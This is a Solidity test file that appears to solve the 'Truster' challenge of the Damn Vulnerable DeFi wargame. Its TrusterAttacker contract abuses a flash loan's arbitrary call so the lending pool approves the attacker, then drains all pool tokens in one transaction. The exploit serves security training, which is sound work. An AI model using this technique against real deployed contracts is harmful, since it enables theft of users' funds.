// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // Deploy the attacker contract before player actions start
        TrusterAttacker attacker = new TrusterAttacker();

        // The checkSolvedByPlayer modifier activates vm.startPrank(player) here

        // Call the attack function which executes everything in a single transaction
        attacker.attack(
            address(pool),
            address(token),
            recovery,
            TOKENS_IN_POOL
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}

// Attacker contract to execute the exploit in a single transaction
contract TrusterAttacker {
    function attack(
        address poolAddress,
        address tokenAddress,
        address recoveryAddress,
        uint256 amount
    ) external {
        // Cast to appropriate contract types
        TrusterLenderPool pool = TrusterLenderPool(poolAddress);
        DamnValuableToken token = DamnValuableToken(tokenAddress);

        // Prepare data for the approve function call
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this), // Approve our contract
            amount
        );

        // Execute the flash loan with malicious data
        pool.flashLoan(0, address(this), tokenAddress, data);

        // Transfer all tokens to the recovery address
        token.transferFrom(poolAddress, recoveryAddress, amount);
    }
}
